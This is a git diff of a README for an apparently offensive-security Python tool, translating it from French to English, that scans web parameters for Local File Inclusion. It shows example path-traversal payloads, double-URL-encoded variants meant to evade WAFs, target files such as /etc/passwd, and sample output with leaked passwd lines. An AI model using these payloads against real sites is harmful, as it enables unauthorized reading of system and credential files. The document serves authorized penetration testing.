@@ -1,15 +1,20 @@
 # 🔍 LFI Scanner by Clyde
 
-Un outil simple en Python pour détecter les vulnérabilités de type **Local File Inclusion (LFI)** sur les applications web. Il utilise des chemins couramment exploités ainsi qu’un double encodage optionnel pour contourner les filtres.
+[![Python](https://img.shields.io/badge/Python-3.6%2B-blue?logo=python)](https://www.python.org/)
+[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](./LICENSE)
+[![Status](https://img.shields.io/badge/status-active-brightgreen)](#)
+[![Issues](https://img.shields.io/github/issues/clydedc/lfi-scanner)](https://github.com/clydedc/lfi-scanner/issues)
+
+A simple and efficient Python tool to detect **Local File Inclusion (LFI)** vulnerabilities in web applications. It leverages common file path payloads and supports optional double URL encoding to bypass filters.
 
 ---
 
-## 📌 Fonctionnalités
+## 📌 Features
 
-* Injection automatique de payloads LFI dans un paramètre spécifié.
-* Test avec encodage normal et double encodage URL.
-* Détection de contenu révélateur (comme `/etc/passwd`, erreurs Apache, etc.).
-* Mise en couleur des résultats pour une lecture rapide.
+* ✅ Automatically injects LFI payloads into a specified URL parameter.
+* 🔁 Supports both standard and double URL encoding.
+* 🧠 Detects potential LFI via common response patterns (`/etc/passwd`, Apache logs, etc.).
+* 🎨 Colored console output for better readability.
 
 ---
 
@@ -21,7 +26,7 @@ cd lfi-scanner
 pip install -r requirements.txt
 ```
 
-> **Note** : Le fichier `requirements.txt` doit contenir :
+> **Dependencies** (from `requirements.txt`):
 >
 > ```
 > requests
@@ -30,53 +35,58 @@ pip install -r requirements.txt
 
 ---
 
-## 🚀 Utilisation
+## 🚀 Usage
 
 ```bash
-python3 scanner.py <URL> <paramètre>
+python3 scanner.py <URL> <parameter>
 ```
 
-### Exemples
+### Example
 
 ```bash
-python3 scanner.py https://victime.com/index.php page
+python3 scanner.py https://target.com/index.php page
 ```
 
-Cela injectera une série de payloads dans l'URL :
+This will test payloads like:
 
 ```
-https://victime.com/index.php?page=../../../../../../../../etc/passwd
+https://target.com/index.php?page=../../../../../../../../etc/passwd
 ```
 
-et leurs équivalents en **double encodage** :
+And their **double-encoded** equivalents:
 
 ```
-https://victime.com/index.php?page=..%252f..%252f..%252f..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
+https://target.com/index.php?page=..%252f..%252f..%252f..%252f..%252fetc%252fpasswd
 ```
 
 ---
 
-## 🧪 Détails Techniques
+## 🧪 Technical Details
 
-* **Payloads inclus** : fichiers Unix/Linux et Windows fréquemment ciblés.
-* **Encodages testés** :
+* **Included payloads**:
 
-  * *Normal* : brut
-  * *Double encodé* : utile pour contourner certains filtres de sécurité.
-* **Signatures recherchées dans la réponse** :
+  * Linux: `/etc/passwd`, `/proc/self/environ`, Apache logs, etc.
+  * Windows: `boot.ini`, `win.ini`, system32 hosts/services, etc.
 
-  * `"root:x"` (Unix passwd)
-  * `"127.0.0.1"`, `"[apache"`, `"PATH="`, `"USER="` etc.
+* **Encoding modes**:
+
+  * `normal`: plain path traversal.
+  * `double`: double-URL-encoded strings to evade WAFs and filters.
+
+* **Response signatures checked**:
+
+  * `root:x` (Linux passwd file)
+  * `127.0.0.1`, `[apache`, `PATH=`, `USER=`, and others.
 
 ---
 
-## 📦 Exemple de sortie
+## 📦 Sample Output
 
 ```bash
-[+] Starting LFI Scan on https://victime.com/index.php
+[+] Starting LFI Scan on https://target.com/index.php
 
-[*] Testing payload (normal): https://victime.com/index.php?page=../../../../etc/passwd
-[+] Possible LFI detected with payload (normal): https://victime.com/index.php?page=../../../../etc/passwd
+[*] Testing payload (normal): https://target.com/index.php?page=../../../../etc/passwd
+[+] Possible LFI detected with payload (normal): https://target.com/index.php?page=../../../../etc/passwd
 [+] Snippet:
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
@@ -85,15 +95,15 @@ daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
 
 ---
 
-## 👤 Auteur
+## 👤 Author
 
 **Clyde**
-🔗 [GitHub](https://github.com/clydedc)
+🔗 [GitHub Profile](https://github.com/clydedc)
 
 ---
 
 ## ⚠️ Disclaimer
 
-> Cet outil est uniquement destiné à des **fins éducatives** et de **tests de sécurité autorisés**.
-> L'utilisation non autorisée contre des systèmes tiers est **illégale**.
+> This tool is intended **strictly for educational purposes and authorized penetration testing**.
+> **Unauthorized use** against third-party systems is **illegal and unethical**.
 
